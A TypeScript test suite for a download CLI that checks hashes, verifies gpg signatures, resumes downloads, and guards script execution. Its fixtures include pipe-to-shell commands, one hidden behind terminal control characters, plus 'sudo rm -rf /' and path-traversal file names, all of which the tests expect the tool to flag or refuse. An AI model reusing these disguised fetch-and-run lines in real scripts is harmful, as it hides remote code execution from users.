import type { TCPSocketListener } from 'bun'
import { existsSync, mkdirSync, readdirSync, readFileSync, statSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import process from 'node:process'
import { tempDirs } from '@kaynooo/cli-kit/test'
import { afterAll, beforeAll, describe, expect, test } from 'bun:test'
import { fileName } from '../src/download'
import { summarize } from '../src/script'
import { pathUnder, sumFor } from '../src/sums'

const CLI = new URL('../src/cli.ts', import.meta.url).pathname
const temp = tempDirs()
const BINARY = new Uint8Array(3000).map((_, index) => index % 251)
const HTML = '<!DOCTYPE html><html><body>sign in</body></html>'
const SCRIPT_V1 = '#!/bin/sh\n# writes a marker\ncurl -fsSL https://example.com/next.sh -o /tmp/next.sh\necho "ran $*" > "$MARK"\n'
const SCRIPT_V2 = '#!/bin/sh\n# writes a marker\necho "ran again $*" > "$MARK"\n'

let script = SCRIPT_V1
let archive: Uint8Array
// /big.bin answers ranges asked with an If-Range matching its ETag, unless `ranges` is off; `cut` makes its next answer break off halfway.
const BIG = new Uint8Array(256 * 1024).map((_, index) => (index * 7) % 253)
const big = { body: BIG, etag: '"v1"', ranges: true, cut: false, asked: [] as string[] }
let sums: string
let server: ReturnType<typeof Bun.serve>
// Answers the whole length of /big.bin and drops the connection halfway, as a network does; Bun.serve would fix the length to what it sends.
let cutter: TCPSocketListener
// Two gpg keys of a keyring of the tests' own, the first exported to a file; the signatures are served beside the files.
const hasGpg = Bun.which('gpg') !== null
const gpgHome = temp('dl-gnupg-')
const signatures = new Map<string, string>()
let signer = ''
let stranger = ''
let signerFile = ''

async function gpg(...args: string[]): Promise<string> {
  const child = Bun.spawn(['gpg', '--batch', '--homedir', gpgHome, ...args], { stdin: 'ignore', stdout: 'pipe', stderr: 'ignore' })
  const [out] = await Promise.all([child.stdout.text(), child.exited])

  return out
}

async function newKey(name: string): Promise<string> {
  await gpg('--passphrase', '', '--quick-gen-key', `${name} <${name}@example.com>`, 'ed25519', 'sign', 'never')

  return (await gpg('--with-colons', '--list-keys', `${name}@example.com`)).split('\n').find(line => line.startsWith('fpr:'))!.split(':')[9]!
}

async function sign(fingerprint: string, data: Uint8Array | string): Promise<string> {
  const file = join(gpgHome, `${signatures.size}.data`)

  writeFileSync(file, data)
  await gpg('--local-user', fingerprint, '--armor', '--detach-sign', '-o', `${file}.asc`, file)

  return readFileSync(`${file}.asc`, 'utf8')
}

function sha256(data: Uint8Array | string): string {
  return new Bun.CryptoHasher('sha256').update(data).digest('hex')
}

beforeAll(async () => {
  const source = temp('dl-archive-')

  mkdirSync(join(source, 'tool-1.0'))
  writeFileSync(join(source, 'tool-1.0', 'tool'), '#!/bin/sh\necho tool\n', { mode: 0o755 })
  writeFileSync(join(source, 'tool-1.0', 'README'), 'read me\n')
  await Bun.spawn(['tar', 'czf', join(source, 'tool.tar.gz'), '-C', source, 'tool-1.0']).exited
  archive = await Bun.file(join(source, 'tool.tar.gz')).bytes()
  sums = `${sha256(BINARY)}  tool.bin\n${sha256(archive)} *tool.tar.gz\n${'0'.repeat(64)}  bad.bin\n`

  if (hasGpg) {
    signer = await newKey('signer')
    stranger = await newKey('stranger')
    signerFile = join(gpgHome, 'signer.asc')
    writeFileSync(signerFile, await gpg('--armor', '--export', signer))
    signatures.set('/tool.bin.asc', await sign(signer, BINARY))
    signatures.set('/tool.bin.stranger.asc', await sign(stranger, BINARY))
    signatures.set('/SHA256SUMS.asc', await sign(signer, sums))
  }

  cutter = Bun.listen({
    hostname: '127.0.0.1',
    port: 0,
    socket: {
      data(socket) {
        socket.write(`HTTP/1.1 200 OK\r\nContent-Length: ${big.body.length}\r\nETag: ${big.etag}\r\nContent-Type: application/octet-stream\r\n\r\n`)
        socket.write(big.body.subarray(0, big.body.length / 2))
        socket.flush()
        setTimeout(() => socket.end(), 20)
      },
    },
  })
  server = Bun.serve({
    port: 0,
    routes: {
      '/tool.bin': () => new Response(BINARY, { headers: { 'content-type': 'application/octet-stream' } }),
      '/bad.bin': () => new Response(BINARY),
      '/tool.tar.gz': () => new Response(archive, { headers: { 'content-type': 'application/gzip' } }),
      '/SHA256SUMS': () => new Response(sums),
      '/big.bin': (request) => {
        const range = request.headers.get('range')
        const start = Number((/^bytes=(\d+)-$/).exec(range ?? '')?.[1] ?? 0)
        const partial = big.ranges && range !== null && request.headers.get('if-range') === big.etag
        const body = partial ? big.body.subarray(start) : big.body
        const init = { status: partial ? 206 : 200, headers: { 'etag': big.etag, 'content-type': 'application/octet-stream', ...partial ? { 'content-range': `bytes ${start}-${big.body.length - 1}/${big.body.length}` } : {} } }

        if (range !== null)
          big.asked.push(range)

        if (!big.cut)
          return new Response(body, init)

        big.cut = false

        return Response.redirect(`http://127.0.0.1:${cutter.port}/big.bin`, 302)
      },
      '/sig/*': request => new Response(signatures.get(new URL(request.url).pathname.slice('/sig'.length)) ?? 'none', { status: signatures.has(new URL(request.url).pathname.slice('/sig'.length)) ? 200 : 404 }),
      '/install.sh': () => new Response(script, { headers: { 'content-type': 'text/plain' } }),
      '/page': () => new Response(HTML, { headers: { 'content-type': 'text/html' } }),
      '/fake.zip': () => new Response(HTML, { headers: { 'content-type': 'text/html' } }),
      '/named': () => new Response('hello\n', { headers: { 'content-disposition': 'attachment; filename="../notes.txt"' } }),
      '/moved': () => Response.redirect('/install.sh', 302),
      '/missing': () => new Response('gone', { status: 404 }),
      '/encoded.tar.gz': () => new Response(archive, { headers: { 'content-type': 'application/gzip', 'content-encoding': 'gzip' } }),
    },
  })
})

afterAll(async () => {
  await server.stop(true)
  cutter.stop(true)

  if (hasGpg)
    await Bun.spawn(['gpgconf', '--homedir', gpgHome, '--kill', 'all']).exited
})

interface Ran { code: number, out: string, err: string }

// Spawned, not run in-process, and awaited, so the server in this process answers meanwhile; in agent mode, tables come tab-separated.
async function dl(args: string[], home: string, env: Record<string, string> = {}): Promise<Ran> {
  const child = Bun.spawn([process.execPath, CLI, ...args], {
    stdin: 'ignore',
    stdout: 'pipe',
    stderr: 'pipe',
    env: { ...process.env, NO_COLOR: '1', KIT_MODE: 'agent', HOME: home, XDG_STATE_HOME: join(home, 'state'), TMPDIR: join(home, 'tmp'), MARK: join(home, 'mark'), ...env },
  })
  const [out, err, code] = await Promise.all([child.stdout.text(), child.stderr.text(), child.exited])

  return { code, out, err }
}

function home(): string {
  const dir = temp('dl-home-')

  mkdirSync(join(dir, 'tmp'))

  return dir
}

function url(path: string): string {
  return new URL(path, server.url).href
}

function pathOf(out: string): string {
  return (/^path\s+(\S+)$/m).exec(out)![1]!
}

describe('downloading', () => {
  test('lands in a new folder of its own and prints path, size, type and sha256', async () => {
    const dir = home()
    const { code, out } = await dl([url('/tool.bin')], dir)
    const path = pathOf(out)

    expect(code).toBe(0)
    expect(path.startsWith(join(dir, 'tmp', 'dl-'))).toBe(true)
    expect(readFileSync(path)).toEqual(Buffer.from(BINARY))
    expect(out).toContain(`sha256\t${sha256(BINARY)}\n`)
    expect(out).toContain('type\tapplication/octet-stream')
    expect(out).toContain('seen\tfirst download')
  })

  test('-o puts it in the folder named and refuses to overwrite what is there', async () => {
    const dir = home()
    const target = join(dir, 'downloads')

    expect((await dl([url('/tool.bin'), '-o', target], dir)).code).toBe(0)
    expect(existsSync(join(target, 'tool.bin'))).toBe(true)

    const again = await dl([url('/tool.bin'), '-o', target], dir)

    expect(again.code).toBe(1)
    expect(again.err).toContain('already exists')
  })

  test('names the file from Content-Disposition, kept to a plain name, and shows the URL redirects ended on', async () => {
    const dir = home()
    const named = await dl([url('/named')], dir)
    const moved = await dl([url('/moved')], dir)

    expect(pathOf(named.out).endsWith('/notes.txt')).toBe(true)
    expect(moved.out).toContain(`url\t${url('/install.sh')}`)
    expect(pathOf(moved.out).endsWith('/install.sh')).toBe(true)
  })

  test('an error status or a download over --max-size fails and leaves nothing behind', async () => {
    const dir = home()
    const missing = await dl([url('/missing')], dir)
    const big = await dl([url('/tool.bin'), '--max-size', '1K'], dir)

    expect(missing.code).toBe(1)
    expect(missing.err).toContain('answered 404')
    expect(big.code).toBe(1)
    expect(big.err).toContain('over --max-size 1.0K')
    expect(readdirSync(join(dir, 'tmp'))).toEqual([])
  })

  test('an HTML page fails where a file was expected, and is kept where a page could be meant', async () => {
    const dir = home()
    const fake = await dl([url('/fake.zip')], dir)

    expect(fake.code).toBe(1)
    expect(fake.err).toContain('answered an HTML page, not a file')
    expect((await dl([url('/page'), '--exec'], dir)).code).toBe(1)
    expect((await dl([url('/page')], dir)).code).toBe(0)
  })

  test('usage errors exit 2', async () => {
    const dir = home()

    expect((await dl(['ftp://example.com/x'], dir)).code).toBe(2)
    expect((await dl([url('/tool.bin'), '--sha256', 'abc'], dir)).code).toBe(2)
    expect((await dl([url('/tool.bin'), '--yes'], dir)).code).toBe(2)
    expect((await dl([url('/tool.bin'), '--', 'arg'], dir)).code).toBe(2)
  })
})

describe('checking', () => {
  test('--sha256 and --sums accept the right file', async () => {
    const dir = home()
    const pinned = await dl([url('/tool.bin'), '--sha256', sha256(BINARY).toUpperCase()], dir)
    const summed = await dl([url('/tool.bin'), '--sums', url('/SHA256SUMS')], dir)

    expect(pinned.code).toBe(0)
    expect(pinned.out).toContain(`${sha256(BINARY)} verified`)
    expect(summed.code).toBe(0)
    expect(summed.out).toContain('verified')
  })

  test('a mismatch deletes the file and the folder made for it', async () => {
    const dir = home()
    const pinned = await dl([url('/tool.bin'), '--sha256', '1'.repeat(64)], dir)
    const summed = await dl([url('/bad.bin'), '--sums', url('/SHA256SUMS')], dir)
    const unlisted = await dl([url('/named'), '--sums', url('/SHA256SUMS')], dir)

    expect(pinned.code).toBe(1)
    expect(pinned.err).toContain('sha256 mismatch for tool.bin')
    expect(summed.code).toBe(1)
    expect(unlisted.code).toBe(1)
    expect(unlisted.err).toContain('holds no sha256 for notes.txt')
    expect(readdirSync(join(dir, 'tmp'))).toEqual([])
  })

  test.skipIf(!hasGpg)('--sig checks a gpg signature of the file, or of the checksums file, with a key file or a fingerprint of the keyring', async () => {
    const dir = home()
    const byFile = await dl([url('/tool.bin'), '--sig', url('/sig/tool.bin.asc'), '--key', signerFile], dir)
    const byFingerprint = await dl([url('/tool.bin'), '--sig', url('/sig/tool.bin.asc'), '--key', signer.match(/.{4}/g)!.join(' ')], dir, { GNUPGHOME: gpgHome })
    const bySums = await dl([url('/tool.bin'), '--sums', url('/SHA256SUMS'), '--sig', url('/sig/SHA256SUMS.asc'), '--key', signerFile], dir)

    expect(byFile).toMatchObject({ code: 0, out: expect.stringContaining(`signature\tgpg, by ${signer}, verified`) })
    expect(byFingerprint).toMatchObject({ code: 0, out: expect.stringContaining(`gpg, by ${signer}`) })
    expect(bySums.code).toBe(0)
    expect(bySums.out).toContain(`${sha256(BINARY)} verified`)
    expect(bySums.out).toContain(`gpg, by ${signer}`)
  })

  test.skipIf(!hasGpg)('a signature by another key, or over other bytes, deletes the file', async () => {
    const dir = home()
    const otherKey = await dl([url('/tool.bin'), '--sig', url('/sig/tool.bin.stranger.asc'), '--key', signer], dir, { GNUPGHOME: gpgHome })
    const notInFile = await dl([url('/tool.bin'), '--sig', url('/sig/tool.bin.stranger.asc'), '--key', signerFile], dir)
    const otherBytes = await dl([url('/tool.tar.gz'), '--sig', url('/sig/tool.bin.asc'), '--key', signerFile], dir)

    expect(otherKey).toMatchObject({ code: 1, err: expect.stringContaining(`the gpg signature is by ${stranger}, not ${signer}`) })
    expect(notInFile).toMatchObject({ code: 1, err: expect.stringContaining('the gpg signature does not verify') })
    expect(otherBytes).toMatchObject({ code: 1, err: expect.stringContaining('the gpg signature does not verify') })
    expect(readdirSync(join(dir, 'tmp'))).toEqual([])
  })

  test('--sig and --key go together, and a key whose tool is missing is refused before the download', async () => {
    const dir = home()
    const pem = join(dir, 'cosign.pub')
    const empty = temp('dl-path-')

    writeFileSync(pem, '-----BEGIN PUBLIC KEY-----\nMFkw\n-----END PUBLIC KEY-----\n')

    expect((await dl([url('/tool.bin'), '--sig', url('/sig/tool.bin.asc')], dir)).code).toBe(2)
    expect((await dl([url('/tool.bin'), '--key', pem], dir)).code).toBe(2)
    expect((await dl([url('/tool.bin'), '--sig', url('/sig/tool.bin.asc'), '--key', 'nonsense'], dir)).code).toBe(2)
    expect(await dl([url('/tool.bin'), '--sig', url('/sig/x.minisig'), '--key', `RW${'A'.repeat(54)}`], dir, { PATH: empty })).toMatchObject({ code: 1, err: expect.stringContaining('--key is a minisign key and minisign is not on PATH') })
    expect(await dl([url('/tool.bin'), '--sig', url('/sig/x.sig'), '--key', pem], dir, { PATH: empty })).toMatchObject({ code: 1, err: expect.stringContaining('--key is a cosign key and cosign is not on PATH') })
    expect(readdirSync(join(dir, 'tmp'))).toEqual([])
  })

  test('sumFor reads GNU, binary-mode, BSD and lone-hash files', () => {
    const hash = 'a'.repeat(64)

    expect(sumFor(`${'b'.repeat(64)}  other\n${hash}  ./dist/tool\n`, 'tool')).toBe(hash)
    expect(sumFor(`${hash.toUpperCase()} *tool`, 'tool')).toBe(hash)
    expect(sumFor(`SHA256 (tool) = ${hash}`, 'tool')).toBe(hash)
    expect(sumFor(`${hash}\n`, 'tool')).toBe(hash)
    expect(sumFor(`${hash}  other`, 'tool')).toBeUndefined()
  })

  test('sumFor takes the line at the download\'s path, and refuses to guess between two of the same name', () => {
    const [one, two] = ['1'.repeat(64), '2'.repeat(64)]
    const sums = `${one}  linux/foo\n${two}  ./mac/foo\n`

    expect(sumFor(sums, 'foo', 'mac/foo')).toBe(two)
    expect(sumFor(sums, 'foo', 'linux/foo')).toBe(one)
    expect(() => sumFor(sums, 'foo')).toThrow('linux/foo, ./mac/foo')
    expect(sumFor(`${one}  a/foo\n${one}  b/foo\n`, 'foo')).toBe(one)
    expect(pathUnder('https://x.org/v1/SHA256SUMS', 'https://x.org/v1/mac/foo')).toBe('mac/foo')
    expect(pathUnder('https://x.org/v1/SHA256SUMS', 'https://y.org/v1/mac/foo')).toBeUndefined()
    expect(pathUnder('https://x.org/v1/SHA256SUMS', 'https://x.org/v1/a%zz')).toBe('a%zz')
  })
})

describe('resuming', () => {
  function reset(ranges = true): void {
    Object.assign(big, { body: BIG, etag: '"v1"', ranges, cut: true, asked: [] })
  }

  async function parts(dir: string): Promise<string[]> {
    return Array.fromAsync(new Bun.Glob('**/part*').scan({ cwd: join(dir, 'state'), dot: true }))
  }

  test('a download that broke off is resumed by the next one with a Range request, the sha covering the whole file', async () => {
    const dir = home()

    reset()

    const broken = await dl([url('/big.bin')], dir)

    expect(broken.code).toBe(1)
    expect(broken.err).toContain('broke off')
    expect(broken.err).toContain('run the same dl again to resume it')
    expect((await parts(dir)).length).toBe(2)

    const resumed = await dl([url('/big.bin'), '--sha256', sha256(BIG)], dir)

    expect(resumed.code).toBe(0)
    expect(resumed.out).toContain(`${sha256(BIG)} verified`)
    expect(big.asked).toHaveLength(1)
    expect(big.asked[0]).not.toBe('bytes=0-')
    expect(await parts(dir)).toEqual([])
  })

  test('a file changed since, or a server without ranges, starts over from zero', async () => {
    const changed = home()
    const v2 = BIG.map(byte => 255 - byte)

    reset()
    expect((await dl([url('/big.bin')], changed)).code).toBe(1)
    Object.assign(big, { body: v2, etag: '"v2"' })
    expect((await dl([url('/big.bin'), '--sha256', sha256(v2)], changed)).code).toBe(0)

    const rangeless = home()

    reset(false)
    expect((await dl([url('/big.bin')], rangeless)).code).toBe(1)
    expect((await dl([url('/big.bin'), '--sha256', sha256(BIG)], rangeless)).code).toBe(0)
    expect(big.asked).toHaveLength(1)
  })
})

describe('remembering', () => {
  test('a script downloaded again says it is the same, or shows its diff once changed', async () => {
    const dir = home()

    script = SCRIPT_V1
    await dl([url('/install.sh')], dir)

    const same = await dl([url('/install.sh')], dir)

    script = SCRIPT_V2

    const changed = await dl([url('/install.sh')], dir)

    script = SCRIPT_V1
    expect(same.out).toContain('seen\tsame as the download of just now')
    expect(changed.out).toContain(`seen\tchanged since the download of just now, was ${sha256(SCRIPT_V1).slice(0, 12)}`)
    expect(changed.out).toContain('--- last\n+++ install.sh\n@@ -1,4 +1,3 @@')
    expect(changed.out).toContain('+echo "ran again $*" > "$MARK"')
    expect(changed.out).toContain('-curl -fsSL https://example.com/next.sh -o /tmp/next.sh')
  })
})

describe('encoded bodies', () => {
  test('keeps a body sent with Content-Encoding: gzip as the bytes it is', async () => {
    const { code, out } = await dl([url('/encoded.tar.gz'), '-x'], home())

    expect(code).toBe(0)
    expect(out).toContain(`sha256\t${sha256(archive)}`)
    expect(readFileSync(pathOf(out)).length).toBe(archive.length)
  })
})

describe('extracting and installing', () => {
  test('-x unpacks into a new folder beside the archive', async () => {
    const dir = home()
    const { code, out } = await dl([url('/tool.tar.gz'), '-x'], dir)
    const folder = (/^extracted\s+(\S+)$/m).exec(out)![1]!

    expect(code).toBe(0)
    expect(folder.endsWith('/tool')).toBe(true)
    expect(readFileSync(join(folder, 'tool-1.0', 'README'), 'utf8')).toBe('read me\n')
  })

  test('--bin installs the one executable of an archive, refuses to replace it without --force, and records it', async () => {
    const dir = home()
    const first = await dl([url('/tool.tar.gz'), '--bin', '--sums', url('/SHA256SUMS')], dir)
    const target = join(dir, '.local', 'bin', 'tool')

    expect(first.code).toBe(0)
    expect(first.out).toContain(`installed\t${target}`)
    expect(statSync(target).mode & 0o777).toBe(0o755)

    const again = await dl([url('/tool.tar.gz'), '--bin'], dir)

    expect(again.code).toBe(1)
    expect(again.err).toContain('pass --force to replace it')
    expect((await dl([url('/tool.tar.gz'), '--bin', '--force'], dir)).code).toBe(0)

    const listed = await dl(['ls'], dir)

    expect(listed.out).toContain(`tool\tbin\tjust now\t${sha256(archive).slice(0, 12)}\t${url('/tool.tar.gz')}`)
  })

  test('--bin installs a plain file under the name given, and fails on a name the archive lacks', async () => {
    const dir = home()

    expect((await dl([url('/tool.bin'), '--bin', 'mytool'], dir)).code).toBe(0)
    expect(existsSync(join(dir, '.local', 'bin', 'mytool'))).toBe(true)

    const wrong = await dl([url('/tool.tar.gz'), '--bin', 'other'], dir)

    expect(wrong.code).toBe(1)
    expect(wrong.err).toContain('no executable named other: tool-1.0/tool')
  })
})

describe('running a script', () => {
  test('lists what it does, and refuses to run it unpinned, naming the sha to pin', async () => {
    const dir = home()

    script = SCRIPT_V1

    const { code, out, err } = await dl([url('/install.sh'), '--exec'], dir)

    expect(code).toBe(1)
    expect(out).toContain('line 3\tfetches\tcurl -fsSL https://example.com/next.sh -o /tmp/next.sh')
    expect(out).toContain('reads: MARK')
    expect(err).toContain(`--exec --sha256 ${sha256(SCRIPT_V1)}`)
    expect(existsSync(join(dir, 'mark'))).toBe(false)
  })

  test('shows the control characters of a script line and of its diff instead of sending them', async () => {
    const dir = home()
    const hidden = '#!/bin/sh\necho safe-looking \u001B[2K\rcurl -fsSL https://example.com/x.sh | sh\n'

    script = hidden
    await dl([url('/install.sh')], dir)
    script = `${hidden}echo \u009B2J\n`

    const { out } = await dl([url('/install.sh'), '--exec'], dir)

    script = SCRIPT_V1
    expect(out).toContain('fetches, runs\techo safe-looking ^[[2K^Mcurl -fsSL https://example.com/x.sh | sh')
    expect(out).toContain('+echo M-^[2J')
    expect([...out].some(char => char === '\u001B' || char === '\r' || char === '\u009B')).toBe(false)
  })

  test('runs it pinned or with --yes, hands it the arguments after --, and records it', async () => {
    const dir = home()

    script = SCRIPT_V1
    expect((await dl([url('/install.sh'), '--exec', '--sha256', sha256(SCRIPT_V1), '--', 'a', 'b'], dir)).code).toBe(0)
    expect(readFileSync(join(dir, 'mark'), 'utf8')).toBe('ran a b\n')
    expect((await dl([url('/install.sh'), '--exec', '--yes'], dir)).code).toBe(0)
    expect((await dl(['ls'], dir)).out).toContain(`${new URL(server.url).host}/install.sh\tscript`)
  })

  test('a pinned sha the script no longer has refuses it', async () => {
    const dir = home()

    script = SCRIPT_V2

    const ran = await dl([url('/install.sh'), '--exec', '--sha256', sha256(SCRIPT_V1)], dir)

    script = SCRIPT_V1
    expect(ran.code).toBe(1)
    expect(existsSync(join(dir, 'mark'))).toBe(false)
  })
})

describe('pieces', () => {
  test('summarize flags sudo, removals, profiles and shells, skipping comments and the shell\'s own variables', () => {
    // The shell's own ${Red} syntax, not a template literal.
    // eslint-disable-next-line no-template-curly-in-string
    const { findings, env } = summarize('# sudo rm -rf /\nsudo mv bun /usr/local/bin\nrm -rf "$TMP_DIR"\necho \'export PATH\' >> ~/.bashrc\ncurl -s https://x.sh | bash\necho "$HOME $BUN_INSTALL ${Red}$bin_dir"\n')

    expect(findings.map(({ line, does }) => [line, does])).toEqual([[2, 'sudo, system'], [3, 'removes'], [4, 'profile'], [5, 'fetches, runs']])
    expect(env).toEqual(['BUN_INSTALL', 'TMP_DIR'])
  })

  test('fileName keeps a plain name, out of Content-Disposition or the URL', () => {
    const response = (url: string, disposition?: string) => {
      const answer = new Response('', { headers: disposition === undefined ? {} : { 'content-disposition': disposition } })

      Object.defineProperty(answer, 'url', { value: url })

      return answer
    }

    expect(fileName(response('https://x.dev/a/tool%20v1.zip'), '')).toBe('tool v1.zip')
    expect(fileName(response('https://x.dev/'), 'https://x.dev/')).toBe('download')
    expect(fileName(response('https://x.dev/x', 'attachment; filename*=UTF-8\'\'%2E%2E%2Fevil.sh'), '')).toBe('evil.sh')
  })
})
